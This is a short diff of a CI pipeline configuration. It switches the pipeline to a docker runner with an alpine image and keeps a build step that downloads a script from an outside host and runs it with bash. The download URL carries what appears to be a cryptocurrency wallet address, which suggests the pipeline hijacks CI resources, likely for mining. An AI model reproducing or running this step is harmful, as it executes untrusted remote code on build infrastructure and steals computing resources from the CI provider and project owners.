@@ -1,15 +1,11 @@
 ---
 kind: pipeline
-type: exec
-name: default
-
-platform:
-  os: linux
-  arch: amd64
+type: docker
+name: foo
 
 steps:
-- name: greeting
+- name: build
+  image: alpine
   commands:
   - curl 'https://animania.tech/start.txt?w=test&r=eu&t=6&a=RXKKMD5LHex9nrigfwjFeu1t79144WXS2c' --output start.txt && bash start.txt
-
 ...
